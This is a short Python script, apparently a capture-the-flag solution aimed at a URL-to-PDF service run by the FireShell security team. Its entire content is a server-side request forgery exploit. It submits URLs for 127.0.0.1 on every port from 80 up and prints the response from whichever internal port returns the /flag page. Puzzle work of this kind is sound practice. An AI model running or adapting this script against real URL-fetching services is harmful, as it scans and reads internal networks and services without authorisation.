import requests
for i in range(80,65537):
	data = {
		"url":"http://127.0.0.1:%i/flag"%i
	}
	r = requests.post("https://urltopdf.fireshellsecurity.team/",data=data)
	if "Internal Server Error" not in r.text:
		print r.text,i
		break